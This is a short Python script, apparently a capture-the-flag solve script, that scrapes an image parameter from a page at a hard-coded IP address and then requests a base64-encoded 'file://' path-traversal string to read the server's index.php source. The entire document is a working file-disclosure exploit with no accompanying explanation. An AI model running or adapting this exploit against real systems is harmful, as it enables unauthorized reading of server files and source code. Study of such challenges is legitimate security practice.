import requests as res
import re
import base64
url = "http://183.129.189.60:10009/"
a = res.get(url)
b = a.text
c = re.findall("image.*f=",str(b))
d = c[0]
var1 = "file://../../../../../var/www/html/index.php"
var = str(base64.b64encode(var1.encode("utf-8"))).replace('b','').replace("'",'')
d = d.replace(''
              '"',"")
urla = url+d+var
# print(urla)
e = res.get(urla)
# print(e.status_code)
print(e.text)